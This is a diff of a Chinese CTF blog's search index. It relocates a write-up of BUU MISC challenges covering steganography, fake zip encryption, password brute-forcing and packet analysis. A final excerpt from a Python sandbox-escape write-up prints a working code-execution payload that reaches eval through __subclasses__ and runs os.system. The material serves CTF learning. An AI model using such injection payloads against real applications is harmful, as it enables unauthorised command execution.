@@ -1,168 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>BUU—MISC刷题记录</title>
-    <url>/2024/12/20/BUU%E2%80%94MISC%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
-    <content><![CDATA[<p>浅浅记录一下BUU里感觉比较有价值的题目</p>
-<h2 id="0荷兰宽带泄露"><a href="#0荷兰宽带泄露" class="headerlink" title="0荷兰宽带泄露"></a>0荷兰宽带泄露</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192240105.png" alt="image-20241207192240105"></p>
-<p>解压后发现一个bin文件，第一次碰到不知道怎么处理，看了一下别的师傅的wp了解到一种新的工具：<code>RouterPassView</code>(用于破解宽带数据文件的密码)，题目没有提示Flag</p>
-<p>那试试用户名<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192618872.png" alt="image-20241207192618872"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192553975.png" alt="image-20241207192553975"></p>
-<p>解压发现是<code>xls</code>文件,猜测是<code>xls</code>隐写</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193031701.png" alt="image-20241207193031701"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193626760.png" alt="image-20241207193626760"></p>
-<p>但是010一查发现有pk头,改后缀一查<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194005524.png" alt="image-20241207194005524"></p>
-<p><code>flag&#123;M9eVfi2Pcs#&#125;</code></p>
-<h2 id="1被劫持的神秘礼物"><a href="#1被劫持的神秘礼物" class="headerlink" title="1被劫持的神秘礼物"></a>1被劫持的神秘礼物</h2><p>下载是一个流量文件，结合标题应该是流量劫持</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194738383.png" alt="image-20241207194738383"></p>
-<p>主要是HTTP流量，直接追踪流</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194834914.png" alt="image-20241207194834914"></p>
-<p>用<code>captfencoder</code>MD5一下结束战斗</p>
-<p><code>flag&#123;1d240aafe21a86afc11f38a45b541a49&#125;</code></p>
-<h2 id="2被偷走的文件1"><a href="#2被偷走的文件1" class="headerlink" title="2被偷走的文件1"></a>2被偷走的文件1</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207195352502.png" alt="image-20241207195352502"></p>
-<p>用<code>foremost</code>分离，解压需要密码，先确定流量中没有藏密码，再暴力破解</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200247505.png" alt="image-20241207200247505"></p>
-<p><code>flag&#123;6fe99a5d03fb01f833ec3caa80358fa3&#125;</code></p>
-<h2 id="3藏藏藏"><a href="#3藏藏藏" class="headerlink" title="3藏藏藏"></a>3藏藏藏</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200530486.png" alt="image-20241207200530486"></p>
-<p>看到图片结合题目名，感觉图片隐写或者图片里包含文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200653951.png" alt="image-20241207200653951"></p>
-<p>顺利分离出一个压缩包，打开是一个docx文件，隐写无疑了</p>
-<p>然而里面是一个二维码（扫兴啊），直接扫就出来了</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201042011.png" alt="image-20241207201042011"></p>
-<h2 id="4佛系青年"><a href="#4佛系青年" class="headerlink" title="4佛系青年"></a>4佛系青年</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201306534.png" alt="image-20241207201306534"></p>
-<p>解压文档需要密码，有一张<code>png</code>是可以查看的，先010查一下</p>
-<p>查完没有藏文件，那应该就是隐写了</p>
-<p>结果没有发现隐写，感觉被骗了</p>
-<p>看一眼压缩包，是伪加密（这里本来没看见的，后来仔细看才发现，也算学到一点分别伪加密的方法）</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204245901.png" alt="image-20241207204245901"></p>
-<p>改一下解压，文本里可以看到与佛论禅的加密，用一下随波逐流<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204051135.png" alt="image-20241207204051135"></p>
-<h2 id="5刷新过的图片"><a href="#5刷新过的图片" class="headerlink" title="5刷新过的图片"></a>5刷新过的图片</h2><p>附件是一张图片，提醒刷新，本来以为是什么操作，仔细想了以后是F5（刷新）隐写</p>
-<p>把项目git clone之后发现jdk17环境下运行直接报错，换jdk11看看<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164651743.png" alt="image-20241208164651743"></p>
-<p>成功了，打开提取的文件发现有PK头</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164742896.png" alt="image-20241208164742896"></p>
-<p>一开始尝试用复制粘贴的办法在010里重新新建一个文件，但是失败（报错需要分卷，猜测是复制粘贴的过程中有些字符无法被复制）<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165127780.png" alt="image-20241208165127780"></p>
-<p>那么直接改原文件后缀，压缩包是伪加密，手改或者随波逐流走一下结束</p>
-<p><code>flag&#123;96efd0a2037d06f34199e921079778ee&#125;</code></p>
-<h2 id="6秘密文件"><a href="#6秘密文件" class="headerlink" title="6秘密文件"></a>6秘密文件</h2><p>附件是流量，wireshark启动！</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165407266.png" alt="image-20241208165407266"></p>
-<p>foremost出一下，要密码，先尝试弱密码爆破</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165707184.png" alt="image-20241208165707184"></p>
-<p><code>flag&#123;d72e5a671aa50fa5f400e5d10eedeaa5&#125;</code></p>
-<h2 id="7你猜我是个啥"><a href="#7你猜我是个啥" class="headerlink" title="7你猜我是个啥"></a>7你猜我是个啥</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165810484.png" alt="image-20241208165810484"></p>
-<p>看来是改了后缀，010先查查看</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165945001.png" alt="image-20241208165945001"></p>
-<p>演都不演了…</p>
-<h2 id="8鸡你太美"><a href="#8鸡你太美" class="headerlink" title="8鸡你太美"></a>8鸡你太美</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208170109877.png" alt="image-20241208170109877"></p>
-<p>盯完帧没有东西，看看副本，发现已经损坏</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208172403139.png" alt="image-20241208172403139">用010一查是缺少文件头手动补上</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208171838407.png" alt="image-20241208171838407"></p>
-<p>（这里-其实是_）</p>
-<h2 id="9神奇的二维码"><a href="#9神奇的二维码" class="headerlink" title="9神奇的二维码"></a>9神奇的二维码</h2><p>附件是一张二维码，先扫扫看</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194745048.png" alt="image-20241208194745048"></p>
-<p>看来不在这里，用010查一下<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194925593.png" alt="image-20241208194925593"></p>
-<p>里面藏了文件，用 <code>binwalk</code>分离（foremost会分不出来）</p>
-<p>分出来四个包，分别解压<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208195041436.png" alt="image-20241208195041436"></p>
-<p>其中一个包解压是一张jpg和一个压缩包（内含一个同名jpg），有两种想法，一种是压缩可读图片为压缩包明文攻击（<code>crc</code>校验值相同），另一种就是暴力拆包</p>
-<p>先暴力拆包，结果显示不给拆<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208205419372.png" alt="image-20241208205419372"></p>
-<blockquote>
-<p>[!NOTE]</p>
-<p>以下为对题目考察的不是明文攻击的验证，可以跳过</p>
-</blockquote>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208200829953.png" alt="image-20241208200829953"></p>
-<p>初步看一下大小是一样的，那么直接查<code>crc</code>值</p>
-<p>这里我们用ubuntu查，使用<code>crc32</code>命令</p>
-<pre><code class="highlight bash"><span class="built_in">sudo</span> apt install libarchive-zip-perl
-crc32 flag.jpg</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208202527536.png" alt="image-20241208202527536"></p>
-<p>结合压缩包的crc<code>24A345DA</code>，得出不是明文攻击</p>
-<p>还是看看其他几个解压出来的东西吧<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203221291.png" alt="image-20241208203221291"></p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203324389.png" alt="image-20241208203324389"></p>
-<p>到目前为止没有什么用处，看看另一个加密的音频文件和docx文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203515033.png" alt="image-20241208203515033"></p>
-<p>这么长的base64还是要忍不住想是不是base64和图像之间的转换的，但是区区8k字符加上还有一个没有解压的包直接让我打消这个念头了，直接<code>basecrack</code>伺候</p>
-<pre><code class="highlight bash">python3 basecrack.py -m -f flag.txt</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204133481.png" alt="image-20241208204133481">解压之后，用Audacity看一下，一眼摩斯</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204450830.png" alt="image-20241208204450830"></p>
-<p>水平有限，还是手敲罢</p>
-<pre><code class="highlight plaintext">11 111 010 000 0 00 000 0001 0 010 1011 0001 0 010 1011 0 01 000 1011</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204944858.png" alt="image-20241208204944858">大写不对，换个小写</p>
-<p>鉴定为图片纯纯的诈骗（恼</p>
-<h2 id="10梅花香自苦寒来"><a href="#10梅花香自苦寒来" class="headerlink" title="10梅花香自苦寒来"></a>10梅花香自苦寒来</h2><p>附件是一张<code>png</code>，没有其他明显的提示，看一眼属性</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152723027.png" alt="image-20241209152723027"></p>
-<p>要画图，那么应该藏了坐标，010查一下</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152821648.png" alt="image-20241209152821648"></p>
-<p>可以看到文件尾藏了一种数据，接下来有两种方法</p>
-<blockquote>
-<p>随波逐流</p>
-</blockquote>
-<p>将文件拖入会自动提取并且解码，再用其内置的坐标画图最终得到一张反色的二维码</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209153156877.png" alt="image-20241209153156877"></p>
-<p>这个时候用<code>stegsolve</code>反色再扫就出来了</p>
-<blockquote>
-<p>脚本画图</p>
-</blockquote>
-<p>选首尾位置复制到记事本，复制到厨子再hex解码，得到一串坐标<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209154148273.png" alt="image-20241209154148273"></p>
-<p>贴到txt里，接下来就是画图，参考了别的师傅的wp,有两种做法</p>
-<p>​	<code>*gnuplot*</code>绘图</p>
-<p>贴个脚本先</p>
-<pre><code class="highlight plaintext">with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:  # 坐标格式文件比如(7,7)
-    re = res.read()
-    res.close()
-    
-with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:   # 将转换后的坐标写入gnuplotTxt.txt
-    re = re.split()
-    tem = &#x27;&#x27;
-    for i in range(0, len(re)):
-        tem = re[i]
-        tem = tem.lstrip(&#x27;(&#x27;)
-        tem = tem.rstrip(&#x27;)&#x27;)
-        for j in range(0, len(tem)):
-            if tem[j] == &#x27;,&#x27;:
-                tem = tem[:j] + &#x27; &#x27; + tem[j+1:]
-        gnup.write(tem + &#x27;\n&#x27;)
-    gnup.close()</code></pre>
-
-<p>得到去括号，去逗号的坐标值</p>
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155236795.png" alt="image-20241209155236795"></p>
-<p>贴一下ubuntu下的下载和使用方法</p>
-<pre><code class="highlight bash"><span class="built_in">sudo</span> apt-get install gnuplot-x11
-gnuplot
-plot <span class="string">&quot;output.txt&quot;</span></code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155627592.png" alt="image-20241209155627592"></p>
-<p>可以扫出来</p>
-<p>​	<em>matplotlib</em>绘图</p>
-<p>把原文本去括号，用脚本跑</p>
-<pre><code class="highlight plaintext">import matplotlib.pyplot as plt
-import numpy as np
-with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:
-    re = res.read()
-    res.close()
-
-with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:  # 将转换后的坐标写入gnuplotTxt.txt
-    re = re.split()
-    tem = &#x27;&#x27;
-    for i in range(0, len(re)):
-        tem = re[i]
-        tem = tem.lstrip(&#x27;(&#x27;)
-        tem = tem.rstrip(&#x27;)&#x27;)
-        gnup.write(tem + &#x27;\n&#x27;)
-    gnup.close()
-x, y = np.loadtxt(&#x27;output.txt&#x27;, delimiter=&#x27;,&#x27;, unpack=True)
-plt.plot(x, y, &#x27;.&#x27;)
-plt.show()</code></pre>
-
-<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209162242387.png" alt="image-20241209162242387"></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>misc</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2025春秋杯冬季赛</title>
     <url>/2025/01/21/2025%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B/</url>
     <content><![CDATA[<p>菜鸟第一次打这种公开赛，感觉被橄榄了，第二天两个pyjail是一点办法都没有啊。。。</p>
@@ -497,6 +335,168 @@ bkcrack -C flag.zip -c flag.png -p png_header -o 0</code></pre>
 ]]></content>
       <tags>
         <tag>-CTF -misc -WP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BUU—MISC刷题记录</title>
+    <url>/2024/12/20/BUU%E2%80%94MISC%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
+    <content><![CDATA[<p>浅浅记录一下BUU里感觉比较有价值的题目</p>
+<h2 id="0荷兰宽带泄露"><a href="#0荷兰宽带泄露" class="headerlink" title="0荷兰宽带泄露"></a>0荷兰宽带泄露</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192240105.png" alt="image-20241207192240105"></p>
+<p>解压后发现一个bin文件，第一次碰到不知道怎么处理，看了一下别的师傅的wp了解到一种新的工具：<code>RouterPassView</code>(用于破解宽带数据文件的密码)，题目没有提示Flag</p>
+<p>那试试用户名<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192618872.png" alt="image-20241207192618872"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207192553975.png" alt="image-20241207192553975"></p>
+<p>解压发现是<code>xls</code>文件,猜测是<code>xls</code>隐写</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193031701.png" alt="image-20241207193031701"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207193626760.png" alt="image-20241207193626760"></p>
+<p>但是010一查发现有pk头,改后缀一查<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194005524.png" alt="image-20241207194005524"></p>
+<p><code>flag&#123;M9eVfi2Pcs#&#125;</code></p>
+<h2 id="1被劫持的神秘礼物"><a href="#1被劫持的神秘礼物" class="headerlink" title="1被劫持的神秘礼物"></a>1被劫持的神秘礼物</h2><p>下载是一个流量文件，结合标题应该是流量劫持</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194738383.png" alt="image-20241207194738383"></p>
+<p>主要是HTTP流量，直接追踪流</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207194834914.png" alt="image-20241207194834914"></p>
+<p>用<code>captfencoder</code>MD5一下结束战斗</p>
+<p><code>flag&#123;1d240aafe21a86afc11f38a45b541a49&#125;</code></p>
+<h2 id="2被偷走的文件1"><a href="#2被偷走的文件1" class="headerlink" title="2被偷走的文件1"></a>2被偷走的文件1</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207195352502.png" alt="image-20241207195352502"></p>
+<p>用<code>foremost</code>分离，解压需要密码，先确定流量中没有藏密码，再暴力破解</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200247505.png" alt="image-20241207200247505"></p>
+<p><code>flag&#123;6fe99a5d03fb01f833ec3caa80358fa3&#125;</code></p>
+<h2 id="3藏藏藏"><a href="#3藏藏藏" class="headerlink" title="3藏藏藏"></a>3藏藏藏</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200530486.png" alt="image-20241207200530486"></p>
+<p>看到图片结合题目名，感觉图片隐写或者图片里包含文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207200653951.png" alt="image-20241207200653951"></p>
+<p>顺利分离出一个压缩包，打开是一个docx文件，隐写无疑了</p>
+<p>然而里面是一个二维码（扫兴啊），直接扫就出来了</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201042011.png" alt="image-20241207201042011"></p>
+<h2 id="4佛系青年"><a href="#4佛系青年" class="headerlink" title="4佛系青年"></a>4佛系青年</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207201306534.png" alt="image-20241207201306534"></p>
+<p>解压文档需要密码，有一张<code>png</code>是可以查看的，先010查一下</p>
+<p>查完没有藏文件，那应该就是隐写了</p>
+<p>结果没有发现隐写，感觉被骗了</p>
+<p>看一眼压缩包，是伪加密（这里本来没看见的，后来仔细看才发现，也算学到一点分别伪加密的方法）</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204245901.png" alt="image-20241207204245901"></p>
+<p>改一下解压，文本里可以看到与佛论禅的加密，用一下随波逐流<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241207204051135.png" alt="image-20241207204051135"></p>
+<h2 id="5刷新过的图片"><a href="#5刷新过的图片" class="headerlink" title="5刷新过的图片"></a>5刷新过的图片</h2><p>附件是一张图片，提醒刷新，本来以为是什么操作，仔细想了以后是F5（刷新）隐写</p>
+<p>把项目git clone之后发现jdk17环境下运行直接报错，换jdk11看看<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164651743.png" alt="image-20241208164651743"></p>
+<p>成功了，打开提取的文件发现有PK头</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208164742896.png" alt="image-20241208164742896"></p>
+<p>一开始尝试用复制粘贴的办法在010里重新新建一个文件，但是失败（报错需要分卷，猜测是复制粘贴的过程中有些字符无法被复制）<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165127780.png" alt="image-20241208165127780"></p>
+<p>那么直接改原文件后缀，压缩包是伪加密，手改或者随波逐流走一下结束</p>
+<p><code>flag&#123;96efd0a2037d06f34199e921079778ee&#125;</code></p>
+<h2 id="6秘密文件"><a href="#6秘密文件" class="headerlink" title="6秘密文件"></a>6秘密文件</h2><p>附件是流量，wireshark启动！</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165407266.png" alt="image-20241208165407266"></p>
+<p>foremost出一下，要密码，先尝试弱密码爆破</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165707184.png" alt="image-20241208165707184"></p>
+<p><code>flag&#123;d72e5a671aa50fa5f400e5d10eedeaa5&#125;</code></p>
+<h2 id="7你猜我是个啥"><a href="#7你猜我是个啥" class="headerlink" title="7你猜我是个啥"></a>7你猜我是个啥</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165810484.png" alt="image-20241208165810484"></p>
+<p>看来是改了后缀，010先查查看</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208165945001.png" alt="image-20241208165945001"></p>
+<p>演都不演了…</p>
+<h2 id="8鸡你太美"><a href="#8鸡你太美" class="headerlink" title="8鸡你太美"></a>8鸡你太美</h2><p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208170109877.png" alt="image-20241208170109877"></p>
+<p>盯完帧没有东西，看看副本，发现已经损坏</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208172403139.png" alt="image-20241208172403139">用010一查是缺少文件头手动补上</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208171838407.png" alt="image-20241208171838407"></p>
+<p>（这里-其实是_）</p>
+<h2 id="9神奇的二维码"><a href="#9神奇的二维码" class="headerlink" title="9神奇的二维码"></a>9神奇的二维码</h2><p>附件是一张二维码，先扫扫看</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194745048.png" alt="image-20241208194745048"></p>
+<p>看来不在这里，用010查一下<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208194925593.png" alt="image-20241208194925593"></p>
+<p>里面藏了文件，用 <code>binwalk</code>分离（foremost会分不出来）</p>
+<p>分出来四个包，分别解压<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208195041436.png" alt="image-20241208195041436"></p>
+<p>其中一个包解压是一张jpg和一个压缩包（内含一个同名jpg），有两种想法，一种是压缩可读图片为压缩包明文攻击（<code>crc</code>校验值相同），另一种就是暴力拆包</p>
+<p>先暴力拆包，结果显示不给拆<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208205419372.png" alt="image-20241208205419372"></p>
+<blockquote>
+<p>[!NOTE]</p>
+<p>以下为对题目考察的不是明文攻击的验证，可以跳过</p>
+</blockquote>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208200829953.png" alt="image-20241208200829953"></p>
+<p>初步看一下大小是一样的，那么直接查<code>crc</code>值</p>
+<p>这里我们用ubuntu查，使用<code>crc32</code>命令</p>
+<pre><code class="highlight bash"><span class="built_in">sudo</span> apt install libarchive-zip-perl
+crc32 flag.jpg</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208202527536.png" alt="image-20241208202527536"></p>
+<p>结合压缩包的crc<code>24A345DA</code>，得出不是明文攻击</p>
+<p>还是看看其他几个解压出来的东西吧<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203221291.png" alt="image-20241208203221291"></p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203324389.png" alt="image-20241208203324389"></p>
+<p>到目前为止没有什么用处，看看另一个加密的音频文件和docx文件<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208203515033.png" alt="image-20241208203515033"></p>
+<p>这么长的base64还是要忍不住想是不是base64和图像之间的转换的，但是区区8k字符加上还有一个没有解压的包直接让我打消这个念头了，直接<code>basecrack</code>伺候</p>
+<pre><code class="highlight bash">python3 basecrack.py -m -f flag.txt</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204133481.png" alt="image-20241208204133481">解压之后，用Audacity看一下，一眼摩斯</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204450830.png" alt="image-20241208204450830"></p>
+<p>水平有限，还是手敲罢</p>
+<pre><code class="highlight plaintext">11 111 010 000 0 00 000 0001 0 010 1011 0001 0 010 1011 0 01 000 1011</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241208204944858.png" alt="image-20241208204944858">大写不对，换个小写</p>
+<p>鉴定为图片纯纯的诈骗（恼</p>
+<h2 id="10梅花香自苦寒来"><a href="#10梅花香自苦寒来" class="headerlink" title="10梅花香自苦寒来"></a>10梅花香自苦寒来</h2><p>附件是一张<code>png</code>，没有其他明显的提示，看一眼属性</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152723027.png" alt="image-20241209152723027"></p>
+<p>要画图，那么应该藏了坐标，010查一下</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209152821648.png" alt="image-20241209152821648"></p>
+<p>可以看到文件尾藏了一种数据，接下来有两种方法</p>
+<blockquote>
+<p>随波逐流</p>
+</blockquote>
+<p>将文件拖入会自动提取并且解码，再用其内置的坐标画图最终得到一张反色的二维码</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209153156877.png" alt="image-20241209153156877"></p>
+<p>这个时候用<code>stegsolve</code>反色再扫就出来了</p>
+<blockquote>
+<p>脚本画图</p>
+</blockquote>
+<p>选首尾位置复制到记事本，复制到厨子再hex解码，得到一串坐标<img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209154148273.png" alt="image-20241209154148273"></p>
+<p>贴到txt里，接下来就是画图，参考了别的师傅的wp,有两种做法</p>
+<p>​	<code>*gnuplot*</code>绘图</p>
+<p>贴个脚本先</p>
+<pre><code class="highlight plaintext">with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:  # 坐标格式文件比如(7,7)
+    re = res.read()
+    res.close()
+    
+with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:   # 将转换后的坐标写入gnuplotTxt.txt
+    re = re.split()
+    tem = &#x27;&#x27;
+    for i in range(0, len(re)):
+        tem = re[i]
+        tem = tem.lstrip(&#x27;(&#x27;)
+        tem = tem.rstrip(&#x27;)&#x27;)
+        for j in range(0, len(tem)):
+            if tem[j] == &#x27;,&#x27;:
+                tem = tem[:j] + &#x27; &#x27; + tem[j+1:]
+        gnup.write(tem + &#x27;\n&#x27;)
+    gnup.close()</code></pre>
+
+<p>得到去括号，去逗号的坐标值</p>
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155236795.png" alt="image-20241209155236795"></p>
+<p>贴一下ubuntu下的下载和使用方法</p>
+<pre><code class="highlight bash"><span class="built_in">sudo</span> apt-get install gnuplot-x11
+gnuplot
+plot <span class="string">&quot;output.txt&quot;</span></code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209155627592.png" alt="image-20241209155627592"></p>
+<p>可以扫出来</p>
+<p>​	<em>matplotlib</em>绘图</p>
+<p>把原文本去括号，用脚本跑</p>
+<pre><code class="highlight plaintext">import matplotlib.pyplot as plt
+import numpy as np
+with open(&#x27;flag.txt&#x27;, &#x27;r&#x27;) as res:
+    re = res.read()
+    res.close()
+
+with open(&#x27;output.txt&#x27;, &#x27;w&#x27;) as gnup:  # 将转换后的坐标写入gnuplotTxt.txt
+    re = re.split()
+    tem = &#x27;&#x27;
+    for i in range(0, len(re)):
+        tem = re[i]
+        tem = tem.lstrip(&#x27;(&#x27;)
+        tem = tem.rstrip(&#x27;)&#x27;)
+        gnup.write(tem + &#x27;\n&#x27;)
+    gnup.close()
+x, y = np.loadtxt(&#x27;output.txt&#x27;, delimiter=&#x27;,&#x27;, unpack=True)
+plt.plot(x, y, &#x27;.&#x27;)
+plt.show()</code></pre>
+
+<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20241209162242387.png" alt="image-20241209162242387"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>misc</tag>
       </tags>
   </entry>
   <entry>
@@ -1128,11 +1128,45 @@ for i in ().__class__.__bases__[0].__subclasses__():
 <pre><code class="highlight plaintext">().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).system(&#x27;whoami&#x27;)&quot;)</code></pre>
 
 <p>在python交互终端中尝试输出：</p>
-<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903193824030-649565108.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903193824030-649565108.png" alt="img"></a></p>
+<p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903193824030-649565108.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903193824030-649565108.png" alt="img">   </a></p>
 <p>实际注入效果：</p>
 <p><a href="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903194150593-332610088.png"><img src="https://img2020.cnblogs.com/blog/1344396/202009/1344396-20200903194150593-332610088.png" alt="img"></a></p>
 <p>既然大概知道原理跟利用，我这里不再废话，直接给出大佬们各种绕过payload：</p>
